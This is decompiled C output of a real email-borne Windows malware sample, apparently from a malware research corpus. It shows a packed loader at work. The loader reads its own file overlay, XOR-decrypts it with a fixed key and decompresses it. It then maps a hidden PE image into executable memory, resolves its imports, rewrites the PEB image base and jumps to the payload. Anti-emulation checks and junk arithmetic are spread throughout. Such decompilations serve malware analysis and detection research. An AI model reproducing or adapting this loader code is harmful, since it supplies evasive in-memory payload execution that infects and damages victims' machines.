// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0754/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_50 dwArg04, Eq_50 dwArg08, Eq_328 dwArg0C)
{
	globals->dw404090 = 0x0067083F >> (byte) (0x007A9CFF - dwLoc1C);
	GetTextFaceA(GetDC(GetDesktopWindow()), 0x000000FF, fp + 0xFFFFFEE4);
	if (true)
		;
	int32 dwLoc0C_43 = 0x00000000;
	while (dwLoc0C_43 < dwArg0C)
	{
		dwArg04[dwLoc0C_43] = dwArg08[dwLoc0C_43];
		dwLoc0C_43 = dwLoc0C_43 + 0x00000001;
	}
	return;
}

word32 * fn004010C0(word32 * ebp, word32 dwArg04, Eq_50 dwArg08, up32 dwArg0C)
{
	globals->dw404094 = 0x000D9B4B << (byte) globals->dw4040B0;
	if (GetKeyboardType(0x00000000) > 0x07643575)
	{
		globals->dw4040B0 = 0x00000002;
		fp->dwFFFFFFC4 = 0x00000581;
		ExitProcess(0x00000000);
	}
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte cl_61 = *dwArg04;
		up32 dwLoc0C_104 = 0x00000001;
		word32 dwLoc1C_100 = 0x00000000;
		do
		{
			byte al_77 = dwArg04[dwLoc0C_104];
			globals->t4040C0 = 0x00088CAE << (byte) (globals->dw4040D0 - 0x00011F4B);
			up32 ecx_80 = dwLoc0C_104 + 0x00000001;
			dwLoc0C_104 = ecx_80;
			if ((word32) al_77 != (word32) cl_61)
			{
				dwArg08[dwLoc1C_100] = al_77;
				dwLoc1C_100 = dwLoc1C_100 + 0x00000001;
				dwLoc38 = dwLoc24 - globals->dw404098 >> (byte) (globals->dw4040BC + dwLoc24);
			}
			else if ((word32) dwArg04[ecx_80] == 0x00000000)
			{
				dwArg08[dwLoc1C_100] = cl_61;
				globals->t4040C0 = 0x0002955F >> (byte) dwLoc38;
				dwLoc1C_100 = dwLoc1C_100 + 0x00000001;
				dwLoc0C_104 = ecx_80 + 0x00000001;
			}
			else
			{
				globals->dw40408C = globals->dw4040BC *s 0x0008FD55 *s dwLoc10 << (byte) dwLoc28;
				word32 eax_165 = fn004012A0(fp - 0x00000014, dwArg04 + ecx_80) + ecx_80;
				globals->dw4040BC = globals->dw4040D0 *s 0x000004A6;
				dwLoc0C_104 = fn004012A0(fp - 0x0000002C, dwArg04 + eax_165) + eax_165;
				up32 dwLoc20_183 = 0x00000000;
				while (dwLoc20_183 <u dwLoc14)
				{
					globals->t4040C0 = globals->dw4040D0 >> (byte) dwLoc38;
					dwArg08[dwLoc1C_100] = dwArg08[dwLoc1C_100 - dwLoc2C];
					dwLoc1C_100 = dwLoc1C_100 + 0x00000001;
					dwLoc20_183 = dwLoc20_183 + 0x00000001;
				}
			}
		} while (dwLoc0C_104 <u dwArg0C);
	}
}

word32 fn004012A0(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc0C_12 = 0x00000000;
	word32 dwLoc24_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		globals->dw4040D0 = globals->dw404098 - dwLoc14 << 0xFFFFFF81;
		word32 ecx_32 = dwLoc0C_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 ecx_39 = dwLoc24_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc0C_12 = ecx_32;
		dwLoc24_13 = ecx_39;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_32;
	return ecx_39;
}

word32 fn00401320(Eq_50 dwArg04)
{
	word32 eax_34;
	word32 eax_24 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	globals->dw40408C = globals->t4040C0 - globals->t4040C0 - globals->dw4040D0;
	if (eax_24 == 0xFFFFFFFF)
		eax_34 = 0x00000000;
	else
		eax_34 = eax_24;
	return eax_34;
}

void fn00401380(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_931 * fs, word32 dwArg04, word32 dwArg08)
{
	globals->dw40408C = CreateDesktopA;
	globals->dw4040D0 = globals->dw404098 - 0x00075C75;
	int32 eax_45 = dwLoc24 << 0xFFFFFFD5 >> 0xFFFFFF86;
	int32 edx_41 = dwLoc24 - globals->dw40408C << (byte) (0x0005B840 - dwLoc14 << 0x00000043) >> (byte) globals->t4040C0;
	globals->dw404098 = globals->dw4040D0 + eax_45;
	globals->dw4040BC = globals->dw4040BC << (byte) (edx_41 *s edx_41 + 0x0009CE6D);
	int32 ecx_79 = globals->dw4040D0 *s globals->t4040C0 *s 0x00033E4A + globals->t4040C0;
	int32 edx_85 = eax_45 >> (byte) globals->dw4040D0;
	GetModuleHandleA(0x00000000);
	globals->dw404098 = Mem67[0x004040C0:word32] + Mem67[0x0040408C:word32] << (byte) globals->dw404098 << 0xFFFFFFED;
	LoadIconA(GetModuleHandleA(0x00000000), 0x00404000);
	globals->t4040C0 = 0x000C7590 >> (byte) (globals->dw40408C + 0x00020CA3) << 0x0000006B;
	LoadCursorA(0x00000000, 0x00007F00);
	globals->dw4040D0 = edx_85 >> (byte) globals->dw4040D0;
	globals->dw4040BC = 0x000E8BFA - edx_41 - edx_41;
	globals->dw4040D0 = ecx_79 << (byte) ecx_79 << (byte) globals->t4040C0;
	int32 edx_133 = 0x0002A947 >> (byte) ecx_79;
	if ((word32) (word16) RegisterClassA(fp - 0x00000070) == 0x00000000)
	{
l00401BF8:
		return;
	}
	else
	{
		if (dwArg08 != 0x00000001)
			globals->dw4040B8 = 0x00000000;
		else
		{
			globals->dw4040B8 = 0x00000001;
			globals->t4040A0 = dwArg04;
		}
		Eq_328 dwLoc30_330;
		globals->t4040C0 = 0x00080768 - ecx_79 *s edx_41 - 0x00080561;
		fp->dwFFFFFFE8 = 0x00000000;
		Mem302[fp - 0x00000198:word32] = GetModuleHandleA(0x00000000);
		CreateWindowExA(0x00000000, 0x00404048, 0x00404038, 0x00000001, 0x00001982, 0x00000612, 0x00021543, 0x00004652, 0x00000000, 0x00000000, null, 0x00000000);
		globals->dw4040BC = InvalidateRect;
		if (globals->dw4040B8 == 0x00000000)
		{
			fp->dwFFFFFFE8 = 0x00000000;
			dwLoc30_330 = GetModuleHandleA(0x00000000);
		}
		else
			dwLoc30_330 = dwArg04;
		globals->t4040C0.u1 = 0x0040269E;
		ui32 edx_335 = dwLoc28 << (byte) globals->dw404090;
		fp->dwFFFFFFE8 = 0x00000000;
		if (GetKeyboardType(null) > 0x00007787)
		{
			globals->dw404094 = edx_335;
			fp->dwFFFFFFE8 = 0x00000374;
			ExitProcess(null);
		}
		globals->dw40408C = DrawTextW;
		word32 eax_351 = dwLoc30_330 + Mem348[dwLoc30_330 + 0x0000003C:word32];
		if ((word32) (word16) AddAtomA(0x00404060) == 0x00000000)
		{
			fp->dwFFFFFFE8 = 0x00009314;
			ExitProcess(0x00404060);
		}
		globals->dw4040D0 = IsDialogMessageW;
		Eq_531 * eax_379 = ((word32) eax_351->w0006 - 0x00000001) *s 0x00000028 + (&eax_351->w0014 + (word32) eax_351->w0014);
		word32 eax_385 = eax_379->dw0010 - 0x00000001 + eax_351->t003C;
		Eq_558 eax_395 = SEQ(SEQ(0x00000000, eax_385) % eax_351->t003C, eax_385) /u eax_351->t003C *s eax_351->t003C + eax_379->dw0014;
		globals->dw4040BC = DestroyIcon;
		Eq_50 eax_402 = fn004025F0(0x00000200);
		if (eax_402 == 0x00000000)
			goto l00401BF8;
		else
		{
			globals->dw4040D0 = SetScrollInfo;
			fp->dwFFFFFFE8 = 0x00000200;
			Mem419[fp - 0x0000019C:word32] = dwLoc30_330;
			GetModuleFileNameA(0x00000000, eax_402, 0x00000200);
			fp->dwFFFFFFE8 = 0x00FA7F71;
			fp->dwFFFFFFE8 = 0x0040407C;
			word16 ax_428 = (word16) AddAtomA(0x00000200);
			if ((word32) ax_428 == 0x00000000)
			{
				globals->dw4040B0 = 0x6501AD56;
				fp->dwFFFFFFE8 = 0x00412544;
				ExitProcess(&globals->t40407C);
				fp->dwFFFFFFE8 = globals->dw4040A8 *s 0x0024DC9B >> 0x00000028;
			}
			Eq_50 eax_442 = fn00401320(eax_402);
			if (eax_442 == 0x00000000)
				goto l00401BF8;
			else
			{
				int32 edx_454 = edx_133 *s 0x44C97900 >> (byte) globals->dw4040BC;
				globals->dw4040BC = EnumPropsW;
				Eq_674 eax_465 = GetFileSize(eax_442, 0x00000000) - eax_395;
				globals->dw40408C = CreateAcceleratorTableW;
				if (eax_465 == 0x00000000)
					goto l00401BF8;
				else
				{
					fp->dwFFFFFFE8 = eax_465.u0;
					Eq_50 eax_479 = fn004025F0(0x00000000);
					if (eax_479 == 0x00000000)
						goto l00401BF8;
					else
					{
						globals->dw4040D0 = edx_454 >> 0x00 >> (byte) edx_454;
						Mem504[fp - 0x000001A0:word32] = eax_442;
						SetFilePointer(0x00000000, eax_395, 0x00000000, 0x00000000);
						Mem517[fp - 0x000001A0:word32] = eax_479;
						Mem520[fp - 0x000001A4:word32] = eax_442;
						if (ReadFile(0x00004652, 0x00000000, eax_465, fp - 0x00000038, 0x00000000) == 0x00000000)
							goto l00401BF8;
						else
						{
							globals->dw4040D0 = FindWindowExA;
							globals->dw4040D0 = ecx_79 >> 0xFFFFFF84;
							Mem536[fp - 0x00000194:word32] = eax_442;
							CloseHandle(0x00000000);
							globals->dw4040BC = DestroyWindow;
							if (dwLoc38 != eax_465)
								goto l00401BF8;
							else
							{
								if (GetSystemMetrics(0x00000050) == 0x00000000)
								{
									fp->dwFFFFFFE8 = 0x02426385;
									ExitProcess(0x00000050);
								}
								globals->dw40408C = BroadcastSystemMessageA;
								fp->dwFFFFFFE8 = globals->dw404098 *s 0x0009C03E + 0x44C97900;
								ui32 dwLoc24_565 = edx_454 + globals->dw404098 - globals->t4040C0;
								GetTextFaceA(GetDC(GetDesktopWindow()), 0x000000FF, &fp->tFFFFFE6C);
								if (true)
								{
									ExitProcess(0x00938496);
									dwLoc24_565 = globals->dw4040D0 << 0x00000024;
								}
								Mem599[fp - 0x00000198:word32] = eax_479 - 0x00000040 + eax_465;
								fn00401000(eax_479, 0x000000FF, 0x00000040);
								word32 ecx_606 = Mem599[eax_479 + 0x00000000:word32];
								word32 eax_609 = Mem599[eax_479 + 0x00000004:word32];
								up32 dwLoc10_611 = 0x00000000;
								while (dwLoc10_611 <u ecx_606)
								{
									globals->dw4040D0 = globals->dw40408C *s 0x000666C5 << (byte) edx_454;
									(eax_479 + dwLoc10_611)->dw0008 = (eax_479 + dwLoc10_611)->dw0008 ^ 0x84746B8E;
									globals->dw4040BC = 0x00071CAE << (byte) (globals->dw404098 + dwLoc24_565);
									dwLoc10_611 = dwLoc10_611 + 0x00000008;
								}
								Mem645[fp - 0x00000194:word32] = eax_609;
								globals->t4040B4 = fn004025F0(0x00000040);
								if (globals->t4040B4 == 0x00000000)
									ExitProcess(0x00038638);
								word32 esp_710;
								word32 ebp_662 = fn004010C0(fp - 0x00000004, eax_479 + 0x00000008, Mem648[0x004040B4:word32], ecx_606);
								fp->dwFFFFFFE8 = 0x00401B2C;
								ebp_662->dwFFFFFFF8 = globals->dw40408C + 0xFFFFC316 + globals->dw404098 >> 0xFFFFFFBC;
								ebp_662->dwFFFFFFF8 = fp->dwFFFFFFE8;
								globals->dw404098 = globals->dw4040BC - 0x000913DD >> 0xFFFFFF8B;
								globals->ptr4040C8 = fs->ptr0018;
								globals->dw4040D0 = globals->dw404098 + 0x000BEB84 << (byte) ebp_662->dwFFFFFFF8 >> 0xFFFFFF84;
								globals->dw40409C = edi;
								globals->dw404088 = esi;
								globals->dw4040AC = ebx;
								ebp_662->dwFFFFFFF8 = 0x0008F703 >> (byte) (ebp_662->dwFFFFFFF8 - globals->dw404098);
								globals->ptr4040A4 = ebp_662;
								ebp_662->dwFFFFFFF8 = 0x0002D6F0 >> (byte) (ebp_662->dwFFFFFFF8 *s 0x00040671 - globals->t4040C0);
								if (globals->dw4040B8 != 0x00000000)
								{
									Mem773[fp - 0x00000194:word32] = Mem705[ebp_662 - 0x0000000C:word32] - Mem705[0x004040A0:word32];
									fn00401C10(dwArg00);
									esp_710 = fp - 0x00000190;
								}
								else
								{
									fp->dwFFFFFFE8 = 0x00000000;
									Mem784[fp - 0x00000194:word32] = Mem777[ebp_662 - 0x0000000C:word32] - GetModuleHandleA(fp->dwFFFFFFE8);
									fn00401C10(dwArg00);
									esp_710 = fp - 0x00000190;
								}
								Eq_50 * esp_712 = esp_710 - 0x00000004;
								Mem713[esp_712 + 0x00000000:word32] = Mem705[0x004040B4:word32];
								if (fn00401E40(dwArg00) == 0x00000000)
								{
									Mem763[esp_712 + 0x00000000:word32] = Mem713[0x004040B4:word32];
									fn004025B0(dwArg00);
									Mem767[esp_712 + 0x00000000:word32] = 0x00000195;
									ExitProcess(Mem767[esp_712 + 0x00000000:UINT]);
								}
								globals->dw404098 = ebp_662->dwFFFFFFF8 << (byte) (ebp_662->dwFFFFFFF8 + 0x00034B49);
								globals->dw4040BC = ebp_662->dwFFFFFFF8 << (byte) (globals->dw404098 - globals->dw4040BC);
								globals->dw404098 = globals->dw404098 << (byte) globals->t4040C0 >> 0xFFFFFFAB;
								int32 eax_748 = 0x00073EC6 >> (byte) globals->dw404098 >> (byte) globals->dw404098;
								ebp_662->dwFFFFFFF8 = eax_748;
								int32 ecx_756 = ebp_662->dwFFFFFFF8;
								uint8 cl_757 = (byte) ecx_756;
								int32 edx_758 = globals->dw404098 *s 0x000AB574 << (byte) ebp_662->dwFFFFFFF8 >> cl_757;
								globals->dw404098 = edx_758;
								Mem760[0x004040CC:word32]();
								return;
							}
						}
					}
				}
			}
		}
	}
}

void fn00401C10(word32 dwArg04)
{
fn00401C10_entry:
l00401C10:
	Eq_328 dwLoc34_17
	branch globals->dw4040B8 == 0x00000000 l00401C37
l00401C2C:
	dwLoc34_17 = globals->t4040A0;
	goto l00401C42
l00401C37:
	&*dwLoc3C.u0 = 0x00000000;
	dwLoc34_17 = GetModuleHandleA(0x00000000);
l00401C42:
	branch dwLoc34_17 != 0x00000000 l00401C4F
l00401C48:
	goto l00401DC7
l00401C4F:
	word32 eax_49 = dwLoc34_17 + Mem0[dwLoc34_17 + 0x0000003C:word32]
	fp->tFFFFFFC4.u0 = 0x00000040;
	globals->t4040C4 = VirtualAlloc(0x00000000, eax_49->t0050, 0x00003000, null);
	branch globals->t4040C4 != 0x00000000 l00401C86
l00401C7F:
	goto l00401DC7
l00401C86:
	fp->tFFFFFFC4 = eax_49->t0050;
	Mem76[fp - 0x00000040:word32] = dwLoc34_17
	fn00401000(globals->t4040C4, 0x00003000, dwLoc3C)
	word32 ecx_82 = globals->t4040C4 - dwLoc34_17
	branch eax_49->dw00A4 == 0x00000000 l00401DB5
l00401CC2:
	Eq_1193 * dwLoc10_118 = dwLoc34_17 + Mem76[eax_49 + 0x000000A0:word32]
l00401CD1:
	branch dwLoc10_118->dw0004 == 0x00000000 l00401DB5
l00401CDE:
	uint32 edx_140 = dwLoc10_118->dw0004 - 0x00000008 >>u 0x00000001
	globals->dw40408C = globals->dw4040D0 >> 0x0000005F;
	word16 * ecx_147[] = &dwLoc10_118->a0008[0]
	uint32 dwLoc0C_153 = 0x00000000
	goto l00401D36
l00401D2D:
	dwLoc0C_153 = dwLoc0C_153 + 0x00000001;
l00401D36:
	branch dwLoc0C_153 >=u edx_140 l00401DA4
l00401D3E:
	globals->dw4040BC = 0x00028973 >> (byte) globals->dw404098;
	branch (word32) ecx_147[dwLoc0C_153] >> 0x0000000C != 0x00000003 l00401DA2
l00401D63:
	(Mem167[0x004040C4:word32] + Mem167[dwLoc10_118 + 0x00000000:word32])[(word32) ecx_147[dwLoc0C_153] & 0x00000FFF] = (Mem167[0x004040C4:word32] + Mem167[dwLoc10_118 + 0x00000000:word32])[(word32) ecx_147[dwLoc0C_153] & 0x00000FFF] + ecx_82;
l00401DA2:
	goto l00401D2D
l00401DA4:
	dwLoc10_118 = dwLoc10_118 + Mem152[dwLoc10_118 + 0x00000004:word32];
	goto l00401CD1
l00401DB5:
l00401DC7:
	return
fn00401C10_exit:
}

word32 fn00401E40(word32 dwArg04)
{
	word32 eax_277;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_1281 * dwLoc30_121 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_50 eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_277 = 0x00000000;
	else
	{
		globals->dw4040D0 = dwLoc48 - dwLoc14 + 0x000B38F1;
		Mem104[fp - 0x00000064:word32] = Mem95[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem95[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem107[fp - 0x00000068:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		up32 dwLoc10_113 = 0x00000000;
		while (dwLoc10_113 <u (word32) edx_16->w0006)
		{
			if (dwLoc30_121->dw0014 != 0x00000000 && dwLoc30_121->dw0010 != 0x00000000)
			{
				word32 eax_165 = dwLoc30_121->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401000(eax_33 + Mem107[dwLoc30_121 + 0x0000000C:word32], dwArg04 + Mem107[dwLoc30_121 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_165) % edx_16->t003C, eax_165) /u edx_16->t003C *s edx_16->t003C);
			}
			globals->dw40408C = dwLoc08 << 0x00000049;
			dwLoc30_121 = dwLoc30_121 + 1;
			dwLoc10_113 = dwLoc10_113 + 0x00000001;
		}
		word32 edx_193 = eax_33 + Mem107[eax_33 + 0x0000003C:word32];
		Eq_1343 * dwLoc5C_199 = eax_33 + Mem107[edx_193 + 0x00000080:word32];
		while (dwLoc5C_199->dw0010 != 0x00000000)
		{
			Eq_328 eax_222 = GetModuleHandleA(eax_33 + Mem107[dwLoc5C_199 + 0x0000000C:word32]);
			Eq_328 dwLoc1C_224 = eax_222;
			if (eax_222 == 0x00000000)
			{
				if (globals->dw4040B8 != 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l00402433;
				}
				Eq_328 eax_355 = LoadLibraryA(eax_33 + Mem107[dwLoc5C_199 + 0x0000000C:word32]);
				globals->dw4040BC = 0x00000000;
				dwLoc1C_224 = eax_355;
				if (eax_355 == 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l00402433;
				}
				goto l00401FE5;
			}
l00401FE5:
			Eq_1414 * dwLoc44_237;
			Eq_1415 * dwLoc2C_236;
			globals->dw4040D0 = 0x00000000;
			if (dwLoc5C_199->dw0000 != 0x00000000)
			{
				dwLoc2C_236 = eax_33 + Mem232[dwLoc5C_199 + 0x00000000:word32];
				dwLoc44_237 = eax_33 + Mem232[dwLoc5C_199 + 0x00000010:word32];
			}
			else
			{
				dwLoc2C_236 = eax_33 + Mem232[dwLoc5C_199 + 0x00000010:word32];
				dwLoc44_237 = eax_33 + Mem232[dwLoc5C_199 + 0x00000000:word32];
			}
			if (dwLoc5C_199->dw0010 != 0x00000000 && dwLoc5C_199->dw0000 != 0x00000000)
			{
				fp->dwFFFFFFE8 = 0x00000001;
				goto l00402046;
			}
l00402046:
			while (dwLoc2C_236->dw0000 != 0x00000000)
			{
				if ((dwLoc2C_236->dw0000 & 0x80000000) != 0x00000000)
					dwLoc2C_236->dw0000 = GetProcAddress(dwLoc1C_224, dwLoc2C_236->dw0000 & 0x7FFFFFFF);
				else
					dwLoc2C_236->dw0000 = GetProcAddress(dwLoc1C_224, dwLoc2C_236->dw0000 + 0x00000002 + eax_33);
				if (dwLoc2C_236->dw0000 == 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l00402433;
				}
				if (0x00000000 != 0x00000000)
					dwLoc44_237->dw0000 = dwLoc2C_236->dw0000;
				dwLoc2C_236 = dwLoc2C_236 + 1;
				dwLoc44_237 = dwLoc44_237 + 1;
			}
			dwLoc5C_199 = dwLoc5C_199 + 1;
		}
		if (globals->dw4040B8 != 0x00000000)
		{
			word32 ecx_670 = globals->t4040A0 - edx_193->t0034;
			if (edx_193->dw00A4 != 0x00000000)
			{
				Eq_1502 * dwLoc20_679 = eax_33 + Mem107[edx_193 + 0x000000A0:word32];
				while (dwLoc20_679->dw0004 != 0x00000000)
				{
					uint32 ecx_694 = dwLoc20_679->dw0004 - 0x00000008 >>u 0x00000001;
					word16 * edx_697[] = &dwLoc20_679->a0008[0];
					uint32 dwLoc10_700 = 0x00000000;
					while (dwLoc10_700 <u ecx_694)
					{
						globals->dw40408C = dwLoc34 *s globals->t4040C0;
						if ((word32) edx_697[dwLoc10_700] >> 0x0000000C == 0x00000003)
							(eax_33 + Mem711[dwLoc20_679 + 0x00000000:word32])[(word32) edx_697[dwLoc10_700] & 0x00000FFF] = (eax_33 + Mem711[dwLoc20_679 + 0x00000000:word32])[(word32) edx_697[dwLoc10_700] & 0x00000FFF] + ecx_670;
						dwLoc10_700 = dwLoc10_700 + 0x00000001;
					}
					dwLoc20_679 = dwLoc20_679 + Mem107[dwLoc20_679 + 0x00000004:word32];
				}
			}
		}
		Eq_328 eax_382 = edx_193->t0050;
		fp->dwFFFFFFE8 = 0x00000004;
		Eq_1473 eax_393 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_382, 0x00000000);
		if (eax_393 == 0x00000000)
			eax_277 = 0x00000000;
		else
		{
			globals->dw404098 = 0x000D13DF >> (byte) globals->dw404098;
			if (globals->dw4040B8 != 0x00000000)
			{
				Mem635[fp - 0x00000064:word32] = Mem406[0x004040A0:word32];
				fp->dwFFFFFFE8 = 0x00000000;
				fp->dwFFFFFFE8 = 0x00000000;
				fp->dwFFFFFFE8 = 0x00000022;
				fp->dwFFFFFFE8 = eax_393.u0;
				globals->t4040C4 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2084 *) 0x00000004, 0x00000000, 0x00000000, null);
			}
			else
			{
				Mem653[fp - 0x00000064:word32] = Mem406[edx_193 + 0x00000034:word32];
				fp->dwFFFFFFE8 = 0x00000000;
				fp->dwFFFFFFE8 = 0x00000000;
				fp->dwFFFFFFE8 = 0x00000022;
				fp->dwFFFFFFE8 = eax_393.u0;
				globals->t4040C4 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2084 *) 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (globals->t4040C4 == 0x00000000)
			{
				globals->dw404098 = dwLoc34 *s globals->dw4040BC;
				if (globals->dw4040B8 == 0x00000000)
					if (UnmapViewOfFile(edx_193->t0034) == 0x00000000)
					{
						fp->dwFFFFFFE8 = 0x00000000;
						Mem623[fp - 0x0000006C:word32] = Mem619[edx_193 + 0x00000034:word32];
						if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
							eax_277 = 0x00000000;
						else
							goto l004022DD;
					}
					else
						goto l004022DD;
				else if (UnmapViewOfFile(globals->t4040A0) == 0x00000000)
				{
					fp->dwFFFFFFE8 = 0x00000000;
					Mem597[fp - 0x0000006C:word32] = Mem594[0x004040A0:word32];
					if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
						eax_277 = 0x00000000;
					else
					{
l004022AB:
l004022DD:
						if (globals->dw4040B8 != 0x00000000)
						{
							Eq_328 eax_541 = globals->t4040A0;
							fp->dwFFFFFFE8 = 0x00000000;
							fp->dwFFFFFFE8 = 0x00000000;
							fp->dwFFFFFFE8 = 0x00000022;
							globals->t4040C4 = MapViewOfFileEx(eax_393, 0x00000022, null, 0x00000000, 0x00000000, eax_541);
						}
						else
						{
							Eq_328 eax_559 = edx_193->t0034;
							fp->dwFFFFFFE8 = 0x00000000;
							fp->dwFFFFFFE8 = 0x00000000;
							fp->dwFFFFFFE8 = 0x00000022;
							globals->t4040C4 = MapViewOfFileEx(eax_393, 0x00000022, null, 0x00000000, 0x00000000, eax_559);
						}
						if (globals->t4040C4 != 0x00000000)
							goto l00402387;
						else
						{
							if (globals->dw4040B8 != 0x00000000)
							{
								fp->dwFFFFFFE8 = 0x00003000;
								Mem519[fp - 0x0000006C:word32] = Mem515[edx_193 + 0x00000050:word32];
								Mem522[fp - 0x00000070:word32] = Mem519[0x004040A0:word32];
								globals->t4040C4 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							else
							{
								fp->dwFFFFFFE8 = 0x00003000;
								Mem533[fp - 0x0000006C:word32] = Mem529[edx_193 + 0x00000050:word32];
								Mem537[fp - 0x00000070:word32] = Mem533[edx_193 + 0x00000034:word32];
								globals->t4040C4 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							if (globals->t4040C4 == 0x00000000)
								eax_277 = 0x00000000;
							else
							{
l00402387:
								globals->t4040C0 = globals->dw4040BC >> 0xFFFFFFB8;
								fn00401000(globals->t4040C4, eax_33, edx_193->t0050);
								if (globals->dw4040B8 != 0x00000000)
									fn00402440(globals->t4040A0, Mem422[0x004040C4:word32] + Mem422[edx_193 + 0x00000028:word32]);
								else
									fn00402540(globals->t4040C4);
								Mem449[0x004040CC:word32] = Mem422[0x004040C4:word32] + Mem422[edx_193 + 0x00000028:word32];
								edx_193->ptr0028 = globals->ptr4040CC;
								globals->t4040C0 = dwLoc14 + 0x00096EF1 + globals->dw4040BC;
								eax_277 = 0x00000001;
							}
						}
					}
				}
				else
					goto l004022AB;
			}
			else
				goto l00402387;
		}
	}
l00402433:
	return eax_277;
}

void fn00402440(Eq_328 dwArg04, word32 dwArg08)
{
	Eq_1939 * eax_16 = globals->ptr4040C8->ptr0030->ptr000C;
	globals->dw4040BC = globals->dw4040D0 *s 0x000937BF;
	Eq_1954 * edx_22 = eax_16->ptr000C;
	globals->dw4040D0 = 0x00019680 << (byte) dwLoc08;
	Eq_1954 * dwLoc1C_101 = edx_22;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc1C_101 == null)
			goto l0040252F;
		if (dwLoc1C_101->dw0018 == dwArg04)
		{
			dwLoc1C_101->dw001C = dwArg08;
			goto l0040252F;
		}
		Eq_1954 * ecx_100 = dwLoc1C_101->ptr0000;
		dwLoc1C_101 = ecx_100;
		if (ecx_100 == edx_22)
			goto l0040252F;
	}
l0040252F:
	return;
}

void fn00402540(Eq_50 dwArg04)
{
	globals->dw40408C = globals->dw404098 *s 0x00071E5A + dwLoc08;
	Eq_933 * ecx_13 = globals->ptr4040C8;
	ecx_13->ptr0030->dw0008 = dwArg04;
	return;
}

void fn004025B0(word32 dwArg04)
{
	globals->dw404098 = globals->dw40408C << (byte) dwLoc10;
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn004025F0(word32 dwArg04)
{
	Eq_17 eax_8 = GetDesktopWindow();
	globals->t4040C0 = dwLoc18 *s 0x000B600B << (byte) (globals->dw404098 - dwLoc24);
	GetWindowTextA(eax_8, fp + 0xFFFFFED4, 0x000000C8);
	globals->t4040C0 = dwLoc10 - globals->dw4040D0 - dwLoc10 + 0x000F3EAC;
	word32 eax_52 = HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
	globals->dw40408C = dwLoc14 - dwLoc08 *s globals->dw40408C;
	return eax_52;
}

